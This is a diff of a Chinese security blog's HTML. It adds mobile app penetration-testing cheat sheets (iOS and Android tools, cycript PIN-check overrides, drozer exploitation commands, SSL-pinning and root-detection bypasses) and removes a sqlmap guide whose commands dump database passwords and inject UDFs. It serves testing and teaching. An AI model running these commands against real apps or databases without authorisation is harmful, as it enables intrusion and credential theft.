+<li><a href="https://github.com/stefanesser/dumpdecrypted" target="_blank" rel="external">Dumpdecrypted</a> - 转储文件解密mach-o从内存磁盘文件加密的iPhone应用程序。这个工具是必要的安全研究人员能够看看引擎盖下面的加密。<ul>
+<li>iPod:~root#DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/mobile/Applications/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/Scan.app/Scan</li>
+</ul>
+</li>
+<li><a href="http://stevenygard.com/projects/class-dump/" target="_blank" rel="external">class-dump</a> - 一个命令行实用程序用于检查objective - c运行时信息存储在Mach-O文件。</li>
+<li><a href="https://github.com/limneos/weak_classdump" target="_blank" rel="external">Weak Classdump</a> - 一个命令行实用程序用于检查objective - c运行时信息存储在Mach-O文件。<ul>
+<li>iPod:~ root# cycript -p Skype weak_classdump.cy; cycript -p Skype</li>
+<li>#cy weak_classdump_bundle([NSBundle mainBundle],”/tmp/Skype”)</li>
+</ul>
+</li>
+<li>I<a href="https://www.hex-rays.com/products/ida/index.shtml" target="_blank" rel="external">DA Pro</a>  - IDA是一个Windows,Linux或Mac OS X主持多处理器反汇编程序和调试器提供了很多功能.</li>
+<li><a href="http://hopperapp.com/" target="_blank" rel="external">HopperApp</a> - Hopper是OS X和Linux的逆向工程工具,可以拆卸,反编译和调试32/64bits Intel Mac、Linux、Windows和iOS的可执行文件。</li>
+<li><a href="https://www.veracode.com/iret-ios-reverse-engineering-toolkit" target="_blank" rel="external">iRET</a> - iOS逆向工程工具包是一个工具箱设计自动化的许多常见任务与iOS渗透测试.</li>
+</ul>
+<p>####动态和运行时分析</p>
+<ul>
+<li><p><a href="http://www.cycript.org/" target="_blank" rel="external">cycript</a>  Cycript允许开发人员探讨和修改iOS和Mac OS X上运行的应用程序使用一个混合的objective - c + +和JavaScript语法通过交互式控制台功能语法高亮显示和tab补齐。</p>
+<ul>
+<li>显示当前视图 <ul>
+<li>cy#UIApp.keyWindow.rootViewController.topViewController.visibleViewController</li>
+</ul>
+</li>
+<li>得到一个现有的某个类的对象数组<ul>
+<li>cy# choose(UIViewController)</li>
+</ul>
+</li>
+<li>列表方法在运行时<ul>
+<li>cy# [classname].messages or</li>
+<li>cy# function printMethods(className) { var count = new new Type(“I”); var methods = class_copyMethodList(objc_getClass(className), count); var methodsArray = []; for(var i = 0; i &lt; *count; i++) { var method = methods[i]; methodsArray.push({selector:method_getName(method), implementation:method_getImplementation(method)}); } free(methods); free(count); return methodsArray; }</li>
+<li>cy# printMethods(“[classname]”)</li>
+</ul>
+</li>
+<li>打印出所有的实例变量<ul>
+<li>cy# function tryPrintIvars(a){ var x={}; for(i in a){ try{ x[i] = (a)[i]; } catch(e){} } return x; }</li>
+<li>cy# a=#0x15d0db80</li>
+<li>cy# tryPrintIvars(a)</li>
+</ul>
+</li>
+<li>操纵通过属性<ul>
+<li>cy# [a pinCode]</li>
+<li>cy# [a setPinCode: @”1234”]</li>
+<li>cy# [a isValidPin]</li>
+<li>cy# a-&gt;isa.messages[‘isValidPin’] = function(){return 1;}</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><a href="https://appsec-labs.com/cydia/" target="_blank" rel="external">iNalyzer</a> - 应用安全实验iNalyzer操纵iOS应用程序是一个框架,篡改参数和方法。</p>
+</li>
+<li><a href="https://github.com/dmayer/idb" target="_blank" rel="external">idb</a> - idb是一个工具来简化为iOS其中一些常见任务和研究。</li>
+<li><a href="http://cydia.radare.org/" target="_blank" rel="external">snoop-it</a>  - 一个工具来协助安全评估和动态分析的iOS应用程序。</li>
+<li><a href="https://github.com/iSECPartners/Introspy-iOS" target="_blank" rel="external">Introspy-iOS</a>  黑盒测试工具来帮助理解一个iOS应用程序在运行时所做的和协助识别潜在的安全问题</li>
+<li><a href="http://cydia.radare.org/" target="_blank" rel="external">gdb</a> - IOS应用程序的执行运行时分析工具。</li>
+<li><a href="http://cydia.radare.org/" target="_blank" rel="external">keychaindumper</a> -检查哪些密钥链项可用的工具来攻击者一旦iOS设备已经越狱。</li>
+<li><a href="http://securitylearn.net/wp-content/uploads/tools/iOS/BinaryCookieReader.py" target="_blank" rel="external">BinaryCookieReader</a>  -一个工具来转储所有二进制的cookie .binarycookies文件</li>
+</ul>
+<h4 id="u7F51_u7EDC_u5206_u6790_u548C_u670D_u52A1_u5668_u7AEF_u6D4B_u8BD5"><a href="#u7F51_u7EDC_u5206_u6790_u548C_u670D_u52A1_u5668_u7AEF_u6D4B_u8BD5" class="headerlink" title="网络分析和服务器端测试"></a>网络分析和服务器端测试</h4><p><a href="www.contextis.com/services/research/canape/">Canape</a>  - 网络测试工具任意协议<br><a href="https://intrepidusgroup.com/insight/mallory/" target="_blank" rel="external">Mallory</a> - 一个中间人工具，在移动设备上使用监视和操作和应用程序。<br><a href="https://portswigger.net/burp/download.html" target="_blank" rel="external">Burp Suite</a> - burp 一个集成的平台进行安全测试的应用程序。<br><a href="http://www.charlesproxy.com/" target="_blank" rel="external">Charles Proxy</a> - HTTP代理/ HTTP监控/反向代理,使开发人员能够查看所有的HTTP / HTTPS和SSL通信和互联网之间的机器。</p>
+<h4 id="u7ED5_u8FC7_u6839_u68C0_u6D4B_u548CSSL"><a href="#u7ED5_u8FC7_u6839_u68C0_u6D4B_u548CSSL" class="headerlink" title="绕过根检测和SSL"></a>绕过根检测和SSL</h4><p><a href="https://github.com/nabla-c0d3/ssl-kill-switch2" target="_blank" rel="external">SSL Kill Switch 2</a> - 黑盒测试工具禁用SSL证书验证,包括证书,在iOS和mac OS X应用程序。<br><a href="https://github.com/intrepidusgroup/trustme" target="_blank" rel="external">iOS TrustMe</a>  - 禁用证书信任iOS设备上检查。<br><a href="http://apt.modmyi.com/" target="_blank" rel="external">Xcon</a>  - 绕过越狱的工具检测。<br><a href="http://cydia.saurik.com/package/kr.typostudio.tsprotector8/" target="_blank" rel="external">tsProtector</a>  一个工具绕过越狱检测。</p>
+<h4 id="u5B89_u5168_u5E93"><a href="#u5B89_u5168_u5E93" class="headerlink" title="安全库"></a>安全库</h4><p><a href="https://www.owasp.org/images/9/9a/Pubkey-pin-ios.zip" target="_blank" rel="external">PublicKey Pinning</a> - iOS将通过执行NSURL Connection Delegate。委托必须实现连接；委托必须调用交会信任评估执行惯例X509检查。</p>
+<h5 id="u539F_u6587_u51FA_u5904"><a href="#u539F_u6587_u51FA_u5904" class="headerlink" title="原文出处"></a>原文出处</h5><ul>
+<li><a href="https://www.peerlyst.com/posts/mobile-application-penetration-testing-cheat-sheet" target="_blank" rel="external">https://www.peerlyst.com/posts/mobile-application-penetration-testing-cheat-sheet</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/03/20/移动应用渗透测试备忘单(二)/" data-id="cin5p3miz0001f8fwfesccqlh" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-移动应用渗透测试备忘单(一)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/03/02/移动应用渗透测试备忘单(一)/" class="article-date">
+  <time datetime="2016-03-02T06:45:05.000Z" itemprop="datePublished">2016-03-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/03/02/移动应用渗透测试备忘单(一)/">移动应用渗透测试备忘单(一)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>##移动应用渗透测试备忘单(一)</p>
+<h3 id="Android_u5E94_u7528_u7A0B_u5E8F_u6E17_u900F_u6D4B_u8BD5"><a href="#Android_u5E94_u7528_u7A0B_u5E8F_u6E17_u900F_u6D4B_u8BD5" class="headerlink" title="Android应用程序渗透测试"></a>Android应用程序渗透测试</h3><p>####安卓测试发行版<br><a href="https://manifestsecurity.com/appie" target="_blank" rel="external">Appid</a> -便携式软件包为android和一个很棒的替代现有的虚拟机<br><a href="https://androidtamer.com/" target="_blank" rel="external">Android Tamer android</a>-一个虚拟的/android生活平台安全专家。<br><a href="https://github.com/sh4hin/Androl4b" target="_blank" rel="external">Androl4b</a> -评估Android应用程序的虚拟机,逆向工程和恶意软件分析<br><a href="https://appsec-labs.com/AppUse/" target="_blank" rel="external">AppUse</a>-AppUse是一个VM(虚拟机)由AppSec实验室。<br><a href="https://sourceforge.net/projects/mobisec/" target="_blank" rel="external">Mobisec</a>-移动安全测试现场环境。<br><a href="https://santoku-linux.com/" target="_blank" rel="external">Santoku</a>  是一个操作系统,可以运行虚拟机作为一个独立的操作系统。<br><a href="https://github.com/oguzhantopgul/Vezir-Project" target="_blank" rel="external">Vezir Project</a> -移动应用程序和恶意软件分析环境</p>
+<p>#####一体化的移动安全框架<br><a href="https://github.com/ajinabraham/Mobile-Security-Framework-MobSF" target="_blank" rel="external">Mobile Security Framework - MobSF</a> 移动安全框架是一个聪明、一体化的开源的移动应用程序(Android / iOS)自动化pen-testing框架执行静态和动态分析的能力。</p>
+<pre><code>python manage.py runserver 127.0.0.1:1337
+</code></pre><p>####逆向工程和静态分析<br><a href="https://github.com/honeynet/apkinspector/" target="_blank" rel="external">APKInspector</a>  APKInspector 是一个强大的Android应用程序GUI工具工具</p>
+<ul>
+<li><p>拆卸Android的apk文件</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d <span class="string">[apk]</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重建解码的APK / JAR与证书签名</p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">* apktool b(修改文件夹)</span><br><span class="line">* keytool -genkey -v -keystore keys/test.keystore -alias Test -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 10000</span><br><span class="line">	 -<span class="ruby">genkey 产生一个键值对（公钥和私钥）</span><br><span class="line"></span>	 -<span class="ruby">v 允许动作输出</span><br><span class="line"></span>	 -<span class="ruby"><span class="keyword">alias</span> 后面跟的是别名这里是<span class="constant">Test</span></span><br><span class="line"></span>	 -<span class="ruby">keyalg 是加密方式这里是<span class="constant">RSA</span></span><br><span class="line"></span>	 -<span class="ruby">keysize 产生键的长度。如果不支持，keytool用默认值<span class="number">1024</span> bits</span><br><span class="line"></span>	 -<span class="ruby">sigalg 签名算法<span class="constant">SHA1withRSA</span></span><br><span class="line"></span>	 -<span class="ruby">validity 是有效期这里是<span class="number">10000</span></span><br><span class="line"></span>	 -<span class="ruby">keystore 就是要生成的keystore的名称这里是test.keystore    </span><br><span class="line"></span>* jarsigner -keystore keys/test.keystore dist/test.apk -sigalg SHA1withRSA -digestalg SHA1 Test</span><br><span class="line">	-<span class="ruby"><span class="symbol">keystore:</span> keystore的名称</span><br><span class="line"></span>	-<span class="ruby">sigalg 签名算法，用 <span class="constant">SHA1withRSA</span>.</span><br><span class="line"></span>	-<span class="ruby">digestalg 消息摘要算法，用 <span class="constant">SHA1</span>.</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><a href="https://github.com/appium/sign" target="_blank" rel="external">Sign</a> Sign.jar自动迹象的apk安卓测试证书。</p>
+</li>
+<li><a href="https://github.com/skylot/jadx" target="_blank" rel="external">Jadx</a> Java敏捷编译器:命令行和GUI工具生成Java源代码从Android敏捷和Apk文件</li>
+<li><a href="https://github.com/pxb1988/dex2jar" target="_blank" rel="external">Dex2jar</a>转换的工具.dex文件.class文件(压缩jar)<ul>
+<li>apk文件转换成jar文件<ul>
+<li>Dex2jar [apk 文件] </li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://github.com/testwhat/SmaliEx" target="_blank" rel="external">Oatdex</a> 一个转换的工具.oat 文件到 .dex 文件.<ul>
+<li>反优化引导类(输出将在“odex”和“dex”文件夹)<ul>
+<li>java -jar oat2dex.jar boot [boot.oat 文件]</li>
+</ul>
+</li>
+<li>反优化应用程序<ul>
+<li>java -jar oat2dex.jar [app.odex] [从上面boot-class-folder输出]</li>
+</ul>
+</li>
+<li>从oat 到 odex<ul>
+<li>java -jar oat2dex.jar odex [oat 文件]</li>
+</ul>
+</li>
+<li>得到odex smali从oat/ odex(与优化操作码)<ul>
+<li>java -jar oat2dex.jar smali [oat/odex 文件]</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><a href="http://jd.benow.ca/" target="_blank" rel="external">JD-Gui</a> 反编译和分析Java代码的工具<br><a href="findbugs.sourceforge.net">FindBugs</a> + <a href="findbugs.sourceforge.net">FindSecurityBugs</a> FindSecurityBugs FindBugs是一个扩展,包括Java应用程序的安全规则。</p>
+<p><a href="https://github.com/linkedin/qark" target="_blank" rel="external">Qark</a> 这个工具的目的是寻找几个安全相关的Android应用程序漏洞,在源代码或打包的apk。<br><a href="https://github.com/AndroBugs/AndroBugs_Framework" target="_blank" rel="external">AndroBugs</a> -AndroBugs 是一种有效的Android漏洞扫描器框架,有助于开发人员或黑客在Android应用程序找到潜在的安全漏洞。不需要在Windows上安装。<br><a href="https://github.com/CalebFenton/simplify" target="_blank" rel="external">Simplify</a> android包成Classes.dex反混淆的工具可以使用Dex2jar和JD-GUI提取dex文件的内容。</p>
+<ul>
+<li>simplify.jar -i [输入smali 文件或者文件夹] -o [输出dex 文件]</li>
+</ul>
+<p><a href="https://github.com/HamiltonianCycle/ClassNameDeobfuscator" target="_blank" rel="external">ClassNameDeobfuscator</a> 简单的脚本解析通过.smali文件由apktool提取的源代码注释行。</p>
+<h4 id="u52A8_u6001_u548C_u8FD0_u884C_u65F6_u5206_u6790"><a href="#u52A8_u6001_u548C_u8FD0_u884C_u65F6_u5206_u6790" class="headerlink" title="动态和运行时分析"></a>动态和运行时分析</h4><p><a href="https://github.com/iSECPartners/Introspy-Android" target="_blank" rel="external">Introspy-Android</a>-黑箱工具来帮助理解Android应用程序在运行时所做的和协助识别潜在的安全问题。<br><a href="http://www.cydiasubstrate.com/" target="_blank" rel="external">Cydia Substrate</a> -Cydia Substrate为Android使开发人员能够修改现有软件与底物扩展中注入到目标进程的内存。<br><a href="forum.xda-developers.com/xposed/xposed-installer-versions-changelog-t2714053">Xposed Framework</a> -Xposed框架使您能够在运行时修改系统或应用程序方面和行为,无需修改任何Android应用程序包(apk)或re-flashing。<br><a href="https://github.com/nolanlawson/Catlog" target="_blank" rel="external">CatLog</a>-为Android进行图形记录。<br><a href="https://code.google.com/p/droidbox/" target="_blank" rel="external">Droidbox</a> -DroidBox提供开发Android应用程序的动态分析。<br><a href="https://github.com/marshall/logcat-color" target="_blank" rel="external">logcat-color</a> 丰富多彩和高度可配置的替代adb logcat命令从Android SDK。<br><a href="http://www.frida.re/" target="_blank" rel="external">Frida</a>工具箱使用客户机-服务器模型和允许您将运行的进程不仅在Android上,但同样在iOS,Windows和Mac。<br><a href="https://github.com/swdunlop/AndBug" target="_blank" rel="external">AndBug</a> AndBug调试器针对Android平台的Dalvik虚拟机用于反向工程师和开发人员。<br><a href="https://www.mwrinfosecurity.com/products/drozer/" target="_blank" rel="external">Drozer</a> drozer允许您搜索应用程序的安全漏洞和设备通过假设一个应用程序的作用和交互Dalvik VM,其他应用程序的IPC端点和底层操作系统。</p>
+<ul>
+<li>开始一个会话<ul>
+<li>adb forward tcp:31415 tcp:31415</li>
+<li>Drozer console connect</li>
+</ul>
+</li>
+<li>检索包信息<ul>
+<li>run app.package.list -f [app 名称]</li>
+<li>run app.package.info -a [包名]</li>
+</ul>
+</li>
+<li>确定攻击表面<ul>
+<li>run app.package.attacksurface [包名]</li>
+</ul>
+</li>
+<li>利用活动<ul>
+<li>run app.Activity.info -a [包名] -u</li>
+<li>run app.Activity.start –component [包名] [组件名]</li>
+</ul>
+</li>
+<li>利用内容提供商<ul>
+<li>run app.provider.info -a [包名]</li>
+<li>run scanner.provider.finduris -a [包名]</li>
+<li>run app.provider.query [uri]</li>
+<li>run app.provider.update [uri] –selection [条件] [选择参数] [列] [数据]</li>
+<li>run scanner.provider.sqltables -a [包名]</li>
+<li>run scanner.provider.Injection -a [包名]</li>
+<li>run scanner.provider.traversal -a [包名]</li>
+</ul>
+</li>
+<li>利用广播接收器<ul>
+<li>run app.broadcast.info -a [包名]</li>
+<li>run app.broadcast.send –component [包名] [组件名] –extra [type] [key] [value]</li>
+<li>run app.broadcast.sniff –action [作用]</li>
+</ul>
+</li>
+<li>利用服务<ul>
+<li>run app.service.info -a [包名]</li>
+<li>run app.service.start –action [action] –component [包名] [组件名]</li>
+<li>run app.service.send [包名] [组件名] –msg [做用] [函数1] [函数2] –extra [类型] [key] [价值]–bundle-as-obj</li>
+</ul>
+</li>
+</ul>
+<h4 id="u7F51_u7EDC_u5206_u6790_u548C_u670D_u52A1_u5668_u7AEF_u6D4B_u8BD5"><a href="#u7F51_u7EDC_u5206_u6790_u548C_u670D_u52A1_u5668_u7AEF_u6D4B_u8BD5" class="headerlink" title="网络分析和服务器端测试"></a>网络分析和服务器端测试</h4><p><a href="http://www.androidtcpdump.com/" target="_blank" rel="external">Tcpdump</a>  -命令行数据包捕获工具。<br><a href="https://www.wireshark.org/download.html" target="_blank" rel="external">Wireshark</a> -一个开源包分析器。</p>
+<ul>
+<li>现场实时数据包捕获<ul>
+<li>adb Shell “tcpdump -s 0 -w - | nc -l -p 4444?</li>
+<li>adb forward tcp:4444 tcp:4444</li>
+<li>nc localhost 4444 | sudo Wireshark -k -S -i ?</li>
+</ul>
+</li>
+</ul>
+<p><a href="http://www.contextis.com/services/research/canape/" target="_blank" rel="external">Canape</a>  - 网络测试工具任意协议。<br><a href="https://intrepidusgroup.com/insight/mallory/" target="_blank" rel="external">Mallory</a>  -一个中间人工具，在移动设备上使用监视和操作和应用程序。<br><a href="https://portswigger.net/burp/download.html" target="_blank" rel="external">Burp Suite</a> - burp 一个集成的平台进行安全测试的应用程序。<br><a href="https://play.google.com/store/apps/details?id=org.proxydroid" target="_blank" rel="external">Proxydroid</a>  -为Android系统提供代理服务。</p>
+<h4 id="u7ED5_u8FC7_u6839_u68C0_u6D4B_u548CSSL"><a href="#u7ED5_u8FC7_u6839_u68C0_u6D4B_u548CSSL" class="headerlink" title="绕过根检测和SSL"></a>绕过根检测和SSL</h4><p><a href="https://github.com/Fuzion24/JustTrustMe" target="_blank" rel="external">Xposed Module: Just Trust Me</a> - 绕过SSL证书锁定Xposed模块。<br><a href="https://github.com/ac-pm/SSLUnpinning_Xposed" target="_blank" rel="external">Xposed Module: SSLUnpinning</a> - Android Xposed模块绕过验证SSL证书(证书锁定)。<br><a href="https://github.com/iSECPartners/Android-SSL-TrustKiller" target="_blank" rel="external">Android SSL Trust Killer</a> - 黑箱工具可绕过长时间在设备上运行的应用程序的SSL证书。<br><a href="https://github.com/iSECPartners/android-ssl-bypass" target="_blank" rel="external">Android-ssl-bypass</a> -一个Android调试工具,可用于绕过SSL,即使证书将被实现,以及其他调试任务。该工具运行作为一个交互式控制台。<br><a href="https://github.com/devadvance/rootcloakplus" target="_blank" rel="external">RootCoak Plus</a> -防止应用程序检测root.</p>
+<h4 id="u5B89_u5168_u5E93"><a href="#u5B89_u5168_u5E93" class="headerlink" title="安全库"></a>安全库</h4><p><a href="https://www.owasp.org/images/1/1f/Pubkey-pin-android.zip" target="_blank" rel="external">PublicKey Pinning </a>-将在Android X509TrustManager下通过一个定制的环境。X509TrustManager执行X509检查除了执行固定配置。<br><a href="https://github.com/moxie0/AndroidPinning" target="_blank" rel="external">Android Pinning</a>  - 是一个独立的库项目,促进了证书将SSL连接的Android应用程序,为了减少证书颁发机构的依赖。<br><a href="https://github.com/tozny/java-aes-crypto" target="_blank" rel="external">Java AES Crypto</a>  -一个简单的Android类加密与解密字符串,旨在避免经典错误,大多数患有这样的类。<br><a href="proguard.sourceforge.net">Proguard</a>  -收缩机混淆器是一个免费的Java类文件,优化器,模糊处理,并预先验证。它检测并删除未使用的类,字段,方法和属性。<br><a href="https://www.zetetic.net/sqlcipher/sqlcipher-for-android/" target="_blank" rel="external">SQL Cipher</a> -SQLCipher是一个开源扩展SQLite提供透明的256位aes加密的数据库文件。<br><a href="https://github.com/scottyab/secure-preferences" target="_blank" rel="external">Secure Preferences</a> -Android共享偏好包装比加密共享偏好的键和值。<br><a href="https://github.com/guardianproject/TrustedIntents" target="_blank" rel="external">Trusted Intents</a> - Android应用程序之间的交互灵活的信任库。</p>
+<h5 id="u539F_u6587_u51FA_u5904"><a href="#u539F_u6587_u51FA_u5904" class="headerlink" title="原文出处"></a>原文出处</h5><ul>
+<li><a href="https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet#dynamic-and-runtime-analysis" target="_blank" rel="external">https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet#dynamic-and-runtime-analysis</a></li>
+<li><a href="https://www.peerlyst.com/posts/mobile-application-penetration-testing-cheat-sheet" target="_blank" rel="external">https://www.peerlyst.com/posts/mobile-application-penetration-testing-cheat-sheet</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/03/02/移动应用渗透测试备忘单(一)/" data-id="cin5p3mj30002f8fw21xohb6f" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-solaris" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2016/01/05/solaris/" class="article-date">
@@ -288,7 +766,7 @@ wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/01/05/solaris/" data-id="cij1b1e6n0002wsfwwvfiztqb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/01/05/solaris/" data-id="cin5p3mji0006f8fw5g81ukuy" class="article-share-link">Share</a>
       
       
     </footer>
@@ -327,7 +805,7 @@ wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/01/04/curl/" data-id="cij1b1e6u0004wsfwffehntdk" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/01/04/curl/" data-id="cin5p3mjp0008f8fwpkhxvonl" class="article-share-link">Share</a>
       
       
     </footer>
@@ -366,7 +844,7 @@ wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/01/04/cmdtime/" data-id="cij1b1e6w0005wsfwrqr0mzvi" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/01/04/cmdtime/" data-id="cin5p3mjt0009f8fwvu4i4z4u" class="article-share-link">Share</a>
       
       
     </footer>
@@ -530,7 +1008,7 @@ wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/31/apache/" data-id="cij1b1e6z0006wsfwe3oqyaw5" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/12/31/apache/" data-id="cin5p3mjw000af8fw8rw0gr4b" class="article-share-link">Share</a>
       
       
     </footer>
@@ -570,7 +1048,7 @@ wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/25/hello-world/" data-id="cij1b1e6q0003wsfwril53vjx" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/12/25/hello-world/" data-id="cin5p3mjl0007f8fw73og7hm6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -858,7 +1336,7 @@ tt p://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/25/XSS/" data-id="cij1b1e5t0000wsfwxg2jzuvg" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/12/25/XSS/" data-id="cin5p3mie0000f8fw7ihhws5y" class="article-share-link">Share</a>
       
       
     </footer>
@@ -868,45 +1346,10 @@ tt p://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;
 
 
   
-    <article id="post-sqlmap" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2015/12/25/sqlmap/" class="article-date">
-  <time datetime="2015-12-25T06:45:05.000Z" itemprop="datePublished">2015-12-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/12/25/sqlmap/">sqlmap用法指南</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>SQL注入神器之sqlmap使用说明</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">sqlmap验证基础信息</span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span> --current-user <span class="comment">#获取当前用户名称 </span></span><br><span class="line"></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://www.xxoo.com/news?id=1"</span> --current-db <span class="comment">#获取当前数据库名称</span></span><br><span class="line"></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://www.xxoo.com/news?id=1"</span> --tables -D <span class="string">"db_name"</span> <span class="comment">#列表名 </span></span><br><span class="line"></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span> --columns -T <span class="string">"tablename"</span> users-D <span class="string">"db_name"</span> -v <span class="number">0</span> <span class="comment">#列字段</span></span><br><span class="line"></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span> --dump -C <span class="string">"column_name"</span> -T <span class="string">"table_name"</span> -D <span class="string">"db_name"</span> -v <span class="number">0</span> <span class="comment">#获取字段内容</span></span><br><span class="line"></span><br><span class="line">sqlmap验证信息内容</span><br><span class="line"></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>  --smart  --level <span class="number">3</span> --users  <span class="comment"># smart智能 level  执行测试等级</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>  --dbms <span class="string">"Mysql"</span> --users  <span class="comment"># dbms 指定数据库类型</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --users  <span class="comment">#列数据库用户</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --dbs<span class="comment">#列数据库 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --passwords <span class="comment">#数据库用户密码 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --passwords-U root  -v <span class="number">0</span> <span class="comment">#列出指定用户数据库密码</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>     --dump -C <span class="string">"password,user,id"</span> -T <span class="string">"tablename"</span> -D <span class="string">"db_name"</span> --start <span class="number">1</span> --stop <span class="number">20</span>  </span><br><span class="line"><span class="comment">#列出指定字段，列出20条 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --dump-all -v <span class="number">0</span> <span class="comment">#列出所有数据库所有表</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --privileges <span class="comment">#查看权限 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --privileges -U root <span class="comment">#查看指定用户权限</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --is-dba -v <span class="number">1</span> <span class="comment">#是否是数据库管理员</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --roles <span class="comment">#枚举数据库用户角色 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --udf-inject <span class="comment">#导入用户自定义函数（获取系统权限！）</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --dump-all --exclude-sysdbs -v <span class="number">0</span> <span class="comment">#列出当前库所有表</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --union-cols <span class="comment">#union 查询表记录 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span 